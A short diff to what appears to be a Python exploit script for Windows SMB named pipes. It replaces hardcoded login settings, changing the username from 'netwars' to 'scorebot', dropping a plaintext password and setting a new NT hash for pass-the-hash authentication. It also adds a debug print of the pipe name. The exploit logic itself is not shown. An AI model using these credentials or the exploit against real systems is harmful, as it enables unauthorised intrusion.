@@ -33,11 +33,13 @@ Tested on:
 - Windows 2000 SP4 x86
 '''
 
-USERNAME = 'netwars'
-PASSWORD = 'PA$$word0123456'
+USERNAME = 'scorebot'
 PASSWORD = ''
+#LM = ""
+#NT = ""
+#PASSWORD = ''
 LM = "aad3b435b51404eeaad3b435b51404ee"
-NT = "739446e8656fc5d0bfc6c39ab867cd30"
+NT = "0242a8ba255de651e7227e7b6d45dc66"
 
 '''
 A transaction with empty setup:
@@ -997,6 +999,7 @@ if len(sys.argv) < 3:
 target = sys.argv[1]
 method = sys.argv[2]
 pipe_name = None if len(sys.argv) < 4 else sys.argv[3]
+print pipe_name
 
 exploit(target, pipe_name)
 print('Done')
